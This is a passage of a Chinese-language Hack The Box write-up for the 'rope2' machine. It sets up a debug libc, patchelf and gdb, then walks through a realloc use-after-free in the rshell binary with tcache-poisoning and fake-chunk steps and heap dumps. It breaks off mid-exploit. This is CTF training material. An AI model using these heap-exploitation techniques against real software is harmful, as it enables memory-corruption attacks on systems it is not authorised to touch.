class="line">已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 303 See Other</span><br><span class="line">位置：https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb [跟随至新的 URL]</span><br><span class="line">--2021-02-17 15:54:03--  https://launchpadlibrarian.net/418347029/libc6-dbg_2.29-0ubuntu2_amd64.deb</span><br><span class="line">正在解析主机 launchpadlibrarian.net (launchpadlibrarian.net)... 224.0.0.2</span><br><span class="line">正在连接 launchpadlibrarian.net (launchpadlibrarian.net)|224.0.0.2|:443... [proxychains] Dynamic chain  ...  127.0.0.1:1080  ...  launchpadlibrarian.net:443  ...  OK</span><br><span class="line">已连接。</span><br><span class="line">已发出 HTTP 请求，正在等待回应... 200 OK</span><br><span class="line">长度：5698988 (5.4M) [application/x-debian-package]</span><br><span class="line">正在保存至: “libc6-dbg_2.29-0ubuntu2_amd64.deb”</span><br><span class="line"></span><br><span class="line">libc6-dbg_2.29-0ubuntu2_amd64.deb  100%[===============================================================&gt;]   5.43M  1.96MB/s  用时 2.8s    </span><br><span class="line"></span><br><span class="line">2021-02-17 15:54:09 (1.96 MB/s) - 已保存 “libc6-dbg_2.29-0ubuntu2_amd64.deb” [5698988/5698988])</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># dpkg --fsys-tarfile libc6-dbg_2.29-0ubuntu2_amd64.deb | tar xOf - ./usr/lib/debug/lib/x86_64-linux-gnu/libc-2.29.so &gt; libc-2.29.so</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># eu-unstrip libc.so.6-ropetwo libc-2.29.so</span></span><br><span class="line">──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># mv libc-2.29.so&#123;,-debug&#125;</span></span><br></pre></td></tr></table></figure>

<p>现在将使用patchelf告诉rshell使用这些:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># patchelf --set-interpreter ./ld-linux-x86-64.so.2 ./rshell</span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># patchelf --replace-needed libc.so.6 ./libc-2.29.so-debug  ./rshell</span></span><br></pre></td></tr></table></figure>

<p>本地rshell正在使用这两个库:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># ldd rshell</span></span><br><span class="line">        linux-vdso.so.1 (0x00007ffc0cdee000)</span><br><span class="line">        ./libc-2.29.so-debug (0x00007f0e2ec0c000)</span><br><span class="line">        ./ld-linux-x86-64.so.2 =&gt; /lib64/ld-linux-x86-64.so.2 (0x00007f0e2ee00000)</span><br></pre></td></tr></table></figure>

<ul>
<li>gdb</li>
</ul>
<p>对于初始环境，在主机上运行</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">echo</span> 0 &gt; /proc/sys/kernel/randomize_va_space</span><br></pre></td></tr></table></figure>

<p>来转向ASLR。这将允许在想要的地方放一个断点，而不必每次都调整。</p>
<p>为了跟踪堆，使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3Njd3VhcHR4L1B3bmdkYg==">Pwngdb<i class="fa fa-external-link-alt"></i></span>(不要与pwndbg混淆)。heapinfo命令打印出各种freed bins的漂亮视图。</p>
<p>将所有这些放在一起，为gdb创建了以下初始化文件:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">set</span> pagination off</span><br><span class="line">b *0x0000555555555c2b</span><br><span class="line"><span class="built_in">command</span> 1</span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont1p</span> = *((long int*)0x555555558060)</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont1</span> = *(char[]*)<span class="variable">$cont1p</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$name1</span> = *(char[]*) 0x555555558068</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;[0x%08x%08x] %-8s: %s\n&quot;</span>, <span class="variable">$cont1p</span> &gt;&gt; 32, <span class="variable">$cont1p</span>, <span class="variable">$name1</span>, <span class="variable">$cont1</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont2p</span> = *((long int*)0x555555558130)</span><br><span class="line"><span class="built_in">set</span> <span class="variable">$cont2</span> = *(char[]*)<span class="variable">$cont2p</span></span><br><span class="line"><span class="built_in">set</span> <span class="variable">$name2</span> = *(char[]*) 0x555555558138</span><br><span class="line"><span class="built_in">printf</span> <span class="string">&quot;[0x%08x%08x] %-8s: %s\n&quot;</span>, <span class="variable">$cont2p</span> &gt;&gt; 32, <span class="variable">$cont2p</span>, <span class="variable">$name2</span>, <span class="variable">$cont2</span></span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line">x/48xg 0x55555555c2f0</span><br><span class="line"><span class="built_in">echo</span> -----------------------------------\n</span><br><span class="line">heapinfo</span><br><span class="line"><span class="built_in">continue</span></span><br><span class="line">end</span><br></pre></td></tr></table></figure>

<p>这将在读取下一个命令之前，在0xc2b处设置一个断点。在这个断点处，它将计算出两个文件的名称和内容，并打印结果。然后，它将从堆中打印48个单词在工作的区域(确实修改了这个地址，因为关注的是堆的不同部分)。最后，它将运行heapinfo来显示bins。然后它会继续。通过这种方式，可以逐步遍历Python脚本并从那里运行函数，gdb窗口将继续在每个命令之后打印状态。</p>
<p>确实在~/.gdbinit文件中注释了Peda的来源，因为无法让它停止在每个break上打印上下文，这会将正在打印的所有信息从屏幕上删除。</p>
<h2 id="放在一起"><a href="#放在一起" class="headerlink" title="放在一起"></a>放在一起</h2><p>现在，启动Python脚本，Python调试器(pdb)设置为停止在最后一行，以便可以继续运行命令:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># python3 -mpdb -c &#x27;b 57&#x27; -c c exp.py</span></span><br><span class="line">Breakpoint 1 at /root/hackthebox/machine/rope2/exp.py:57</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/rshell&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[*] <span class="string">&#x27;/root/hackthebox/machine/rope2/libc.so.6-ropetwo&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./rshell&#x27;</span>: pid 4649</span><br><span class="line">&gt; /root/hackthebox/machine/rope2/exp.py(57)&lt;module&gt;()</span><br><span class="line">-&gt; x=1</span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>现在在另一个面板中，将附加gdb，然后告诉它继续:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">┌──(root💀kali)-[~/hackthebox/machine/rope2]</span><br><span class="line">└─<span class="comment"># gdb -q -p $(pidof rshell) --command=gdb-rshell.init</span></span><br><span class="line">Attaching to process 4649</span><br><span class="line">Reading symbols from /root/hackthebox/machine/rope2/rshell...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> /root/hackthebox/machine/rope2/rshell)</span><br><span class="line">Reading symbols from ./libc-2.29.so-debug...</span><br><span class="line">Reading symbols from ./ld-linux-x86-64.so.2...</span><br><span class="line">(No debugging symbols found <span class="keyword">in</span> ./ld-linux-x86-64.so.2)</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">RAX: 0xfffffffffffffe00 </span><br><span class="line">RBX: 0x0 </span><br><span class="line">RCX: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">RDX: 0xc7 </span><br><span class="line">RSI: 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">RDI: 0x0 </span><br><span class="line">RBP: 0x7fffffffe010 --&gt; 0x555555555c30 (push   r15)</span><br><span class="line">RSP: 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">RIP: 0x7ffff7eebf81 (&lt;__GI___libc_read+17&gt;:     cmp    rax,0xfffffffffffff000)</span><br><span class="line">R8 : 0x2 </span><br><span class="line">R9 : 0x7ffff7fcb5c0 (0x00007ffff7fcb5c0)</span><br><span class="line">R10: 0x3 </span><br><span class="line">R11: 0x246 </span><br><span class="line">R12: 0x555555555150 (xor    ebp,ebp)</span><br><span class="line">R13: 0x7fffffffe0f0 --&gt; 0x1 </span><br><span class="line">R14: 0x0 </span><br><span class="line">R15: 0x0</span><br><span class="line">EFLAGS: 0x246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">   0x7ffff7eebf7b &lt;__GI___libc_read+11&gt;:        jne    0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;</span><br><span class="line">   0x7ffff7eebf7d &lt;__GI___libc_read+13&gt;:        xor    eax,eax</span><br><span class="line">   0x7ffff7eebf7f &lt;__GI___libc_read+15&gt;:        syscall </span><br><span class="line">=&gt; 0x7ffff7eebf81 &lt;__GI___libc_read+17&gt;:        cmp    rax,0xfffffffffffff000</span><br><span class="line">   0x7ffff7eebf87 &lt;__GI___libc_read+23&gt;:        ja     0x7ffff7eebfe0 &lt;__GI___libc_read+112&gt;</span><br><span class="line">   0x7ffff7eebf89 &lt;__GI___libc_read+25&gt;:        ret    </span><br><span class="line">   0x7ffff7eebf8a &lt;__GI___libc_read+26&gt;:        nop    WORD PTR [rax+rax*1+0x0]</span><br><span class="line">   0x7ffff7eebf90 &lt;__GI___libc_read+32&gt;:        push   r12</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0x7fffffffdf28 --&gt; 0x555555555bfa (mov    DWORD PTR [rbp-0xd4],eax)</span><br><span class="line">0008| 0x7fffffffdf30 --&gt; 0x7ffff7ffeac0 --&gt; 0x7ffff7ffe9f0 --&gt; 0x7ffff7ffe758 --&gt; 0x7ffff7ffe730 --&gt; 0x7ffff7fd0000 (jg     0x7ffff7fd0047)</span><br><span class="line">0016| 0x7fffffffdf38 --&gt; 0x0 </span><br><span class="line">0024| 0x7fffffffdf40 --&gt; 0x0 </span><br><span class="line">0032| 0x7fffffffdf48 --&gt; 0x0 </span><br><span class="line">0040| 0x7fffffffdf50 --&gt; 0x0 </span><br><span class="line">0048| 0x7fffffffdf58 --&gt; 0x0 </span><br><span class="line">0056| 0x7fffffffdf60 --&gt; 0x0 </span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">0x00007ffff7eebf81 <span class="keyword">in</span> __GI___libc_read (fd=0x0, buf=0x7fffffffdf40, nbytes=0xc7) at ../sysdeps/unix/sysv/linux/read.c:26</span><br><span class="line">26      ../sysdeps/unix/sysv/linux/read.c: 没有那个文件或目录.</span><br><span class="line">Breakpoint 1 at 0x555555555c2b</span><br></pre></td></tr></table></figure>

<p>当添加一个文件:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;test&#x27;</span>, 0x60, <span class="string">&#x27;this is a test&#x27;</span>) </span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb)</span><br></pre></td></tr></table></figure>

<p>gdb更新：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line">[0x000055555555b260] <span class="built_in">test</span>    : this is a <span class="built_in">test</span></span><br><span class="line"></span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c320: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c330: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c340: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c350: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c360: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c370: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c380: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c390: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c3f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c400: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c410: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c420: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c430: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c450: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c460: 0x0000000000000000      0x0000000000000000</span><br><span class="line">-----------------------------------</span><br><span class="line">(0x20)     fastbin[0]: 0x0</span><br><span class="line">(0x30)     fastbin[1]: 0x0                                                                                                                 </span><br><span class="line">(0x40)     fastbin[2]: 0x0                                                                                                                 </span><br><span class="line">(0x50)     fastbin[3]: 0x0                                                                                                                 </span><br><span class="line">(0x60)     fastbin[4]: 0x0                                                                                                                 </span><br><span class="line">(0x70)     fastbin[5]: 0x0                                                                                                                 </span><br><span class="line">(0x80)     fastbin[6]: 0x0                                                                                                                 </span><br><span class="line">(0x90)     fastbin[7]: 0x0                                                                                                                 </span><br><span class="line">(0xa0)     fastbin[8]: 0x0                                                                                                                 </span><br><span class="line">(0xb0)     fastbin[9]: 0x0                                                                                                                 </span><br><span class="line">                  top: 0x55555555b2c0 (size : 0x20d40)                                                                                     </span><br><span class="line">       last_remainder: 0x0 (size : 0x0)                                                                                                    </span><br><span class="line">            unsortbin: 0x0</span><br></pre></td></tr></table></figure>

<h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><p>开发这种漏洞利用程序太疯狂了。每次进入下一个步骤时，都必须返回并完全重新构建前一个，移动方块，尝试不同大小的bins。不可能在本文中展示所有这些步骤，但是，将尝试在完成的脚本中完成不同的目标，并展示如何使用脚本操作堆来完成所需要的任务。但是值得补充的是，当第一次在堆上获得libc地址时，代码看起来完全不同。当进入下一个步骤时，将使用相同的通用技术，但需要完全重新设计不同bins的间距和大小，以完成已经实现的目标和下一个目标。</p>
<h2 id="弱点"><a href="#弱点" class="headerlink" title="弱点"></a>弱点</h2><ul>
<li>描述</li>
</ul>
<p>这里的漏洞在于编辑命令中的realloc，以及它如何根据当前大小和新大小做出反应:</p>
<table>
<thead>
<tr>
<th align="left">大小比较</th>
<th align="left">采取动作</th>
</tr>
</thead>
<tbody><tr>
<td align="left">new_size == 0</td>
<td align="left">free(buffer), return null</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &lt; orig_size</td>
<td align="left">分成两个块，返回相同的地址和更小的块，并在旧块的末尾留下空闲块</td>
</tr>
<tr>
<td align="left">new_size &gt; 0 &amp;&amp; new_size &gt; orig_size</td>
<td align="left">释放旧块，为更大的块分配新块，并返回该地址。</td>
</tr>
</tbody></table>
<p>上面的代码检查返回值是否为null，但随后只打印一条消息，而不更改存储的指针。这会给用户留下一个指向已释放内存的指针，这是很糟糕的。</p>
<ul>
<li>例子</li>
</ul>
<p>为了看到这一点，将运行以下代码:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">(Pdb) add(<span class="string">&#x27;1&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) add(<span class="string">&#x27;2&#x27;</span>, 0x50)</span><br><span class="line">b<span class="string">&#x27;$ &#x27;</span></span><br><span class="line">(Pdb) rm(<span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">(Pdb) edit(<span class="string">&#x27;2&#x27;</span>, 0)</span><br></pre></td></tr></table></figure>

<p>这样就剩下了以下内容(&lt;– 由我添加):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------------</span><br><span class="line">[0x0000000000000000]         : (null)</span><br><span class="line">[0x000055555555c2c0] 2       : `UUUU                        &lt;-- still have pointer to chunk2</span><br><span class="line">-----------------------------------</span><br><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 1</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- tcache pointer null, key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2b0: 0x0000000000000000      0x0000000000000061  &lt;-- freed chunk 2</span><br><span class="line">0x55555555c2c0: 0x000055555555c260      0x000055555555c010  &lt;-- tcache pointer to freed 1, key</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c300: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c310: 0x0000000000000000      0x0000000000020cf1  &lt;-- end of heap</span><br><span class="line">...[snip]...</span><br><span class="line">-----------------------------------</span><br><span class="line">...[snip]...</span><br><span class="line">                  top: 0x55555555c310 (size : 0x20cf0) </span><br><span class="line">       last_remainder: 0x0 (size : 0x0) </span><br><span class="line">            unsortbin: 0x0</span><br><span class="line">(0x60)   tcache_entry[4](2): 0x55555555c2c0 --&gt; 0x55555555c260  &lt;-- both chunks <span class="keyword">in</span> tcache list</span><br></pre></td></tr></table></figure>

<p>这是可利用的，因为还有一个指向edit2的指针，尽管它已经被释放了。这意味着可以通过编辑2来更改tcache链表。</p>
<h2 id="在堆上得到libc"><a href="#在堆上得到libc" class="headerlink" title="在堆上得到libc"></a>在堆上得到libc</h2><ul>
<li>策略</li>
</ul>
<p>从这个小漏洞到代码执行的路径并不明显。因为ASLR，需要做的第一件事就是从libc泄露一些信息。要做到这一点，首先需要从libc获得一些东西到堆上。当释放这些bins时，它们将进入tcache，这是一堆从libc开始的单链表，然后列表容器中的每一项都是指向下一项的指针。但其他类型是双链表。这意味着每个节点既指向它后面的节点，也指向它前面的节点，因此第一个节点在libc中具有起始节点的地址。可以通过用7个给定大小的bins填充tcache，然后再释放一个bin，将一些东西放入未排序的bins中。</p>
<p>这将需要大量的跳跃，当被限制在只有两个“文件”的程序在同一时间。</p>
<ul>
<li>间距</li>
</ul>
<p>ASLR和Full RELRO将改变每个单词除了低12位以外的所有内容。可以一遍又一遍地运行程序，只要以相同的顺序定义相同的块，每个地址的低12位将是相同的。这意味着可以找到一些地方，在那里可以只覆盖地址中的低字节，从而在不知道高字节的情况下更改它。这也意味着有些时候想从某个特定的空间开始。如果在0x2e0处创建了一个假块，并且不能覆盖当前指向0x320的指针。但是如果在开始时只向堆中添加一小块，并将它们移到0x310和0x350，现在可以用0x10覆盖较低的0x50。</p>
<ul>
<li>假块</li>
</ul>
<p>创建一个假的重叠块，它可以写入下一个块的元数据。可以在上面的示例中选择，但不是第一个块写入任何感兴趣的内容，而是让它写入一些看起来像堆元数据的内容，例如，0x61:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="string">&#x27;A&#x27;</span>, 0x40, p64(0)*5 + p64(0x61) + p64(0))   <span class="comment"># A at 260 in f1</span></span><br><span class="line">add(<span class="string">&#x27;B&#x27;</span>, 0x40)                                  <span class="comment"># B at 2b0 in f2</span></span><br></pre></td></tr></table></figure>

<p>当运行这个时，堆看起来像:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- data, but looks like heap meta</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x0000000000000a78      0x0000000000000000  &lt;-- B data</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11  &lt;-- end of heap</span><br></pre></td></tr></table></figure>

<p>释放A，然后释放B，把它编辑为0。然后在添加另一个0x40 bin时，将使两个文件指向同一个位置。从这里开始，移除第一个B将会进入想要攻击的地方:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">rm(<span class="string">&#x27;A&#x27;</span>)                                         <span class="comment"># A in 0x50 tcache, f1 empty</span></span><br><span class="line">edit(<span class="string">&#x27;B&#x27;</span>, 0)                                    <span class="comment"># B -&gt; A in 0x50 tcache, f2 still B</span></span><br><span class="line">add(<span class="string">&#x27;B2&#x27;</span>, 0x40)                                 <span class="comment"># A in 0x50 tcache, f1 &amp; f2 -&gt; B</span></span><br><span class="line">rm(<span class="string">&#x27;B&#x27;</span>)                                         <span class="comment"># B -&gt; A in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>

<p>堆循环如下:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">0x55555555c250: 0x0000000000000000      0x0000000000000051  &lt;-- A meta</span><br><span class="line">0x55555555c260: 0x0000000000000000      0x000055555555c010  &lt;-- A pointer to next (null) and key</span><br><span class="line">0x55555555c270: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c280: 0x0000000000000000      0x0000000000000061  &lt;-- fake chunk</span><br><span class="line">0x55555555c290: 0x0000000000000000      0x000000000000000a</span><br><span class="line">0x55555555c2a0: 0x0000000000000000      0x0000000000000051  &lt;-- B meta</span><br><span class="line">0x55555555c2b0: 0x000055555555c260      0x000055555555c010  &lt;-- pointer to A and key</span><br><span class="line">0x55555555c2c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x55555555c2f0: 0x0000000000000000      0x0000000000020d11</span><br></pre></td></tr></table></figure>

<p>当现在用一个字符编辑B2, 0x90，它将覆盖tcache指针:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">edit(<span class="string">&#x27;B2&#x27;</span>, 0x40, <span class="string">&#x27;\x90&#x27;</span>)                        <span class="comment"># B -&gt; fake1 in 0x50 tcache, f1 -&gt; B</span></span><br></pre></td></tr></table></figure>
<p>Heap:</p>
